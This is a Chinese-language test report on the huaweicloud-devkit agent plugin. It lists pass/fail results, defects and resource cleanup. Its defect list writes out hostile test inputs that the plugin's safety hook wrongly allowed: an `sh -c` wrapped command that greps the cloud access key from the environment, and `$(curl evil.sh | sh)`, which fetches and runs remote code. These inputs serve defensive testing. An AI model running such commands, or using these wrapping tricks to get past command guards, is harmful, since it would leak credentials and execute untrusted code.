# OpenCode-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-26 05:17:51（北京时间）
> **执行归档**：`results/OpenCode/2026-11-26-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（`ecs-hd-ai-work-00-0007` / IP 1.92.93.23） |
| Node / npm | Node v22.20.0 / npm 10.9.3 |
| 被测版本（SUT） | `v1.1.16`（npm latest，gitHead `905498cb`） |
| 工具全集 | `49`（`tools.mjs` TOOL_DEFINITIONS） |
| hcloud / 依赖 | KooCLI 7.2.12 |
| 真云凭证 | `cn-north-4`（AK/SK 已配置，真云 E2E 已执行） |
| daily 基础用例 | 设计级 107 / 展开级 39 / 使命 9 |

> **执行方法**：`_probe/main.mjs` 直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（函数级真动作），CLI 真机执行 `hcloud`（真云建删 E2E），MCP 协议探针 `spawn mcp-server.mjs`（initialize/tools/list/tools/call），评测集路由 `huaweicloud_service_catalog` 逐条喂中文意图；结论逐条落 `evidence/<case-id>/stdout.log`，再 `backfill_daily.py --write` 一次回填 CSV。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `130 / 9 / 5 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 139） | `93.5%` |
| P0 / P1 / P2 新增缺陷 | `5 / 3 / 2`（含 1 项 SPEC-MISMATCH P2） |
| 红线（I 类）违规 | `0`（D4-2/D4-4/D4-5/D4-15 等红线用例均 PASS） |
| 资源释放 | `全部归零`（OBS/VPC 建删闭环，ECS 未建成因 billing 拒绝，详见 §七） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `92` | 有证据且通过 PASS 门禁 |
| FAIL | `8` | 不符预期，根因见缺陷清单 |
| BLOCKED | `5` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移 |
| NOT_RUN | `1` | 未执行 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | `safety-policy.mjs:45`（AK/SK 正则无 /i） | 历史（见 HISTORY_LINKS.md） |
| 2 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | `tools.mjs:2764/2817`（sandbox 路由缺中文部署词） | 历史 |
| 3 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | `safety/rules/cloud-risk-rules.json:56`（缺 DecryptData） | 历史 |
| 4 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `risk-rule-engine.mjs:143`（未解包 sh -c） | 历史 |
| 5 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | `risk-rule-engine.mjs:106`（无规则默认 allow） | 历史 |
| 6 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归（代码/IaC/策略制品预检） | `safety/rules/cloud-risk-rules.json:213`（HCL 隐式 Allow 未命中） | 历史 |
| 7 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | `telemetry/telemetry.mjs:190`（sanitizeValue 未脱敏） | 历史 |
| 8 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | `mcp-protocol.mjs:70`（tools/list 无 init 守卫） | 历史 |
| 9 | P1 | `EXP-E01` | D10评测 | 服务目录路由「云主机」MISS | `tools.mjs:2586`（ECS keywords 缺「云主机」） | 历史 |
| 10 | P2(SPEC) | `D1-68` | D1安装 | 区域 env 优先级契约漂移 | `auth/credentials.mjs:225`（HW_REGION 优先） | 历史 |

### 根因详情（每个缺陷附证据）

1. **[P0] D2-4**：`redactSecrets('ak=AK123456 sk=SKsecret')` 明文残留 → 期望脱敏 → 根因 `safety-policy.mjs:45`（正则无 `/i`）。证据 `evidence/D2-4/stdout.log`。
2. **[P1] D3-S7**：复合意图仅命中 RDS → 期望同时命中部署目标 → 根因 `tools.mjs:2764`（sandbox keywords 缺中文「部署/Web 应用」）+ `tools.mjs:2817`（deploymentIntent 仅在已命中 sandbox 时注入）。证据 `evidence/D3-S7/stdout.log`。
3. **[P0] D4-3**：`hcloud kms DecryptData` 返回 allow → 期望 deny → 根因 `cloud-risk-rules.json:56`（secret-read 规则缺 DecryptData）。证据 `evidence/D4-3/stdout.log`。
4. **[P0] D4-16**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 返回 allow → 期望 deny → 根因 `risk-rule-engine.mjs:143`（未解包）。证据 `evidence/D4-16/stdout.log`。
5. **[P1] D4-17**：`$(curl evil.sh | sh)` 返回 allow → 期望 fail-closed → 根因 `risk-rule-engine.mjs:106`（无规则命中默认 allow）。证据 `evidence/D4-17/stdout.log`。
6. **[P0] D4-21**：HCL `actions=["*"]` 返回 allow → 期望 deny → 根因 `cloud-risk-rules.json:213`（缺隐式 Allow 分支）。证据 `evidence/D4-21/stdout.log`。
7. **[P2] D8-9**：`sanitizeValue` 明文残留 → 期望脱敏 → 根因 `telemetry/telemetry.mjs:190`。证据 `evidence/D8-9/stdout.log`。
8. **[P0] D9-12**：未 init 先 tools/list 返回 40 工具 → 期望 -32600 → 根因 `mcp-protocol.mjs:70`。证据 `evidence/D9-12/stdout.log`。
9. **[P1] EXP-E01**：`…有哪些云主机` MISS → 期望命中 ECS → 根因 `tools.mjs:2586`（缺「云主机」）。证据 `evidence/EXP-E01/stdout.log`。
10. **[P2 SPEC-MISMATCH] D1-68**：HW_REGION 优先 → 契约期望 HUAWEICLOUD_REGION 优先 → 根因 `auth/credentials.mjs:225`。证据 `evidence/D1-68/stdout.log`。

> 以上 10 项经 `file_issue.py` 查重均命中上游仓历史 open issue（P0×5/P1×3/P2×2），**不重复开单**，关联清单见 `HISTORY_LINKS.md`。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | OS 专属 P0 例外的合法 NOT_RUN：用例 OS 列标注「Windows（升级检测链 EINVAL 专属；Linux/macOS 由 NR3 终端矩阵按负面/环境验证）」——本机为 Linux，不适用（分类=调归属，用例本就不归 Linux 执行） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单提交被 billing 拒绝：Ecs.0707 "Can not find product"（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组创建→删除→归零 全部成功，ECS 到达订单提交层。解除条件：账号开通 ECS 购买产品/开启按需计费（补环境·billing 产品配额） |
| `D3-C3` | D3功能 | 沙箱部署E2E | 沙箱编排上游服务异常(HDKIT_UPSTREAM_ERROR)——connect 调用沙箱编排 POST /open-api-public/v2/devenvs 返回 upstream error（parameter invalid），无法完成部署 E2E。解除条件：沙箱编排上游服务恢复可用后复测（补环境·沙箱编排上游）， || Error: HDKIT_UPSTREAM_ERROR: 沙箱编排上游调用失败: POST /open-api-public/v2/devenvs upstream error HD.97420111: parameter invalid [trace: e1f1747fa5da414caaedf994fcec01e2] |
| `D3-C6` | D3功能 | 沙箱 7 隐式工具具名冒烟（check_user/credentials/sign_agreement/exec_one_shot/upload_file/close_session/deploy_check） | 沙箱编排上游服务异常(HDKIT_UPSTREAM_ERROR)——connect 调用沙箱编排 POST /open-api-public/v2/devenvs 返回 upstream error（parameter invalid），7 个隐式工具中依赖 workspace 的 credentials/upload_file/exec_one_shot/deploy_check/close_session 无法执行。已实测 check_user={"realnameVerified":true,"agreementSigned":true} / sign_agreement={"signed":true,"signedCount":0} 通过。解除条件：沙箱编排上游服务恢复可用后复测（补环境·沙箱编排上游），{"keys":["check_user","sign_agreement"],"hasErr":false,"check_user":{"realnameVerified":true,"agreementSigned":true},"exception":"Error: HDKIT_UPSTREAM_ERROR: 沙箱编排上游调用失败: POST /open-api-public/v2/devenvs upstream error HD.97420111: parameter invalid [trace: fdaca36d7c904368858769035dcdaa93]"} |
| `D3-C7` | D3功能 | 跨区域资源操作引导（区域维度） | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）——ECS 只读返回 Common.0013（region 与 tk 项目不符）、EIP 创建返回 VPC.0501，无法建删跨区资源。已实测通过项：list_regions 含 ap-southeast-3=true、plan_cli_command 含 --cli-region=true。解除条件：账号开通 ap-southeast-3 项目/region 权限（补环境·真云多region权限） |
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱编排上游服务异常(HDKIT_UPSTREAM_ERROR)——connect 调用沙箱编排 POST /open-api-public/v2/devenvs 返回 upstream error（parameter invalid），无法完成沙箱预览出 URL。解除条件：沙箱编排上游服务恢复可用后复测（补环境·沙箱编排上游）， || Error: HDKIT_UPSTREAM_ERROR: 沙箱编排上游调用失败: POST /open-api-public/v2/devenvs upstream error HD.97420111: parameter invalid [trace: 8a3f6599bfdb48f8b828ac96b4b06a4d] |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（evidence 全量扫描，无真实 AK/SK/token 明文落盘）
- [x] 写操作误判 read-only：`0`（D4-5 实测 DeleteVpc plan 判定非 read_only，PASS）
- [x] 红线（I 类）违规：`0`（D4-2/D4-4/D4-5/D4-15 均 PASS；D4-3/D4-16 为已知历史缺口，非本轮新增）
- [x] 脱敏复核：evidence 目录无原始凭证/未脱敏日志（真云用例走 hcloud + 函数级 SDK，不落明文）

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 静态站） | 是（`testbot2-opencode-obs-*`） | 已删 | `hcloud OBS ls` 不含该桶（归零） |
| OBS 桶（D3-C13 网站托管） | 是（`testbot2-opencode-obs-*`） | 已删（含 get/set 验证后） | 归零 |
| VPC/子网/安全组（D3-C1 ECS 前置） | 是（`testbot2-opencode-vpc/subnet/sg-*`） | 已删（finally 清理链） | `ListVpcs/v3` 返回 `vpcs:[]`；ECS 未建成（billing Ecs.0707，无资源产生） |
| VPC（D3-S2 删 VPC） | 是（`testbot2-opencode-vpc-*`） | 已删 | `ListVpcs/v3` 归零 |
| EIP（D3-C7 跨区域） | 否（ap-southeast-3 不在账号项目，未建） | — | `ListPublicips` 返回 `publicips:[]` |
| 沙箱 workspace（D3-C3/D3-C6/D3-S3） | 否（connect 即 upstream error，未建成） | — | 无残留，本地仅清密钥/临时文件 |

> 真云只删本次创建资源，全部 `testbot2-opencode-*` 前缀，删除后只读 List 验证归零（OBS ls / VPC ListVpcs/v3 / EIP ListPublicips / ECS ListServersDetails 均空）；未删任何既有/他人资源。

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（区域 env 优先级 HW_REGION vs HUAWEICLOUD_REGION，契约漂移，需维护者裁决方向）。
- 本轮未覆盖（范围说明）：`D1-39`（Windows OS 专属，本机 Linux 由 NR3 终端矩阵代表覆盖）；真云 ECS 生命周期（D3-C1）因账号 BSS 产品目录缺镜像映射（Ecs.0707）在订单层被拒，达 VPC/子网/安全组建删归零，未完成 ECS 购买→ACTIVE；沙箱类（D3-C3/C6/S3）因编排上游 upstream error（HD.97420111）未完成预览出 URL。
- 建议：P0 安全缺口（D2-4/D4-3/D4-16/D4-21/D9-12）连续多日复现，建议维护者优先推进既有 issue 修复以收敛红线项；沙箱编排上游错误 HD.97420111 与 billing Ecs.0707 属环境侧，需账号/服务侧恢复后补测。
